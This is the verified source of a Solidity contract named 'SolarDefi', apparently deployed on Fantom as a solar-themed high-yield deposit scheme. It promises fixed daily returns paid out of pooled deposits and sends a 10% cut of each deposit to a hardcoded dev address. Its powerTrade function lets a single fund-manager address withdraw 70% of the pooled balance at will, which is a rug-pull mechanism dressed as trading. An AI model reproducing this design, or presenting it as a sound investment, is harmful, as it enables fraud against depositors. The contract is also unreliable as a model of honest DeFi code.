/**
 *Submitted for verification at FtmScan.com on 2023-07-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SolarDefi {
    address public owner;
    address public devUser = 0xc9D11bB24b010D5DefFeacac1704A70e8f8cceF9;
    address public fundManager = 0x631786aACC05A2427579243291A3359ef814fEda;
    uint256 public devPercentage = 10;
    uint256 public interestRate = 40;
    uint256 public farmingCycle = 700;
    mapping(address => uint256) public installations;
    mapping(address => uint256) public lastWithdrawal;
    uint256 public contractBalance;

    event PanelInstallerHired(address indexed installer, uint256 amount);
    event PowerSold(address indexed installer, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyFundManager() {
        require(msg.sender == fundManager, "Only fund manager can call this function");
        _;
    }

    function hirePanelInstallerInternal(uint256 amount) internal {
        require(amount > 0, "Amount must be greater than zero");

        uint256 devAmount = (amount * devPercentage) / 100;
        uint256 hireAmount = amount - devAmount;

        payable(devUser).transfer(devAmount);

        installations[msg.sender] += hireAmount;
        lastWithdrawal[msg.sender] = block.timestamp;
        contractBalance += hireAmount;

        emit PanelInstallerHired(msg.sender, hireAmount);
    }

    function hirePanelInstaller() external payable {
        hirePanelInstallerInternal(msg.value);
    }

    function tradeDeposit() external payable onlyFundManager {
        require(msg.value > 0, "Amount must be greater than zero");

        contractBalance += msg.value;

        emit PanelInstallerHired(fundManager, msg.value);
    }

    function sellPower() external {
        require(installations[msg.sender] > 0, "No installation found");

        uint256 installationAmount = installations[msg.sender];
        uint256 elapsedTime = block.timestamp - lastWithdrawal[msg.sender];

        uint256 earningPeriods = elapsedTime / (1 days); // Calculate the number of 24-hour earning periods
        uint256 earnings = (installationAmount * interestRate * earningPeriods) / 10000;

        // Calculate real-time interest based on the remaining time in the current earning period
        uint256 remainingTime = elapsedTime % (1 days);
        uint256 currentEarnings = (installationAmount * interestRate * remainingTime) / (10000 * (1 days));
    
        uint256 powerEarnings = earnings + currentEarnings;

      
      // User gets 75% of the sold power

       uint256 usershare=(powerEarnings*75)/100;

      // remaining goes to the contract

       uint256 contract_share= powerEarnings-usershare;


    
        lastWithdrawal[msg.sender] = block.timestamp;


       
        payable(msg.sender).transfer(usershare);  // Pays user 75% 



        // remaning goes to the contract

        hirePanelInstallerInternal(contract_share);

        emit PowerSold(msg.sender, powerEarnings);
    }

    

    function powerTrade() external onlyFundManager {
        uint256 fundAmount = (contractBalance * 70) / 100;

        require(fundAmount > 0, "No funds available for withdrawal");

        payable(fundManager).transfer(fundAmount);
        contractBalance -= fundAmount;

        emit PowerSold(fundManager, fundAmount);
    }

    function getInstallationAmount(address installer) external view returns (uint256) {
        return installations[installer];
    }

    function myMaxReturn(address installer) external view returns (uint256) {
        uint256 installationAmount = installations[installer];
        return (installationAmount * 2394) / 1000;
    }

    function myDailyReturns(address installer) external view returns (uint256) {
        uint256 installationAmount = installations[installer];
        return (installationAmount * interestRate) / 10000;
    }

    function getContractBalance() external view returns (uint256) {
        return contractBalance;
    }

    function getAccruedEarnings(address installer) external view returns (uint256) {
        uint256 installationAmount = installations[installer];
        uint256 elapsedTime = block.timestamp - lastWithdrawal[installer];
        uint256 earningPeriods = elapsedTime / (1 days); // Calculate the number of 24-hour earning periods
        uint256 earnings = (installationAmount * interestRate * earningPeriods) / 10000;

        // Calculate real-time interest based on the remaining time in the current earning period
        uint256 remainingTime = elapsedTime % (1 days);
        uint256 currentEarnings = (installationAmount * interestRate * remainingTime) / (10000 * (1 days));

        return earnings + currentEarnings;
    }
}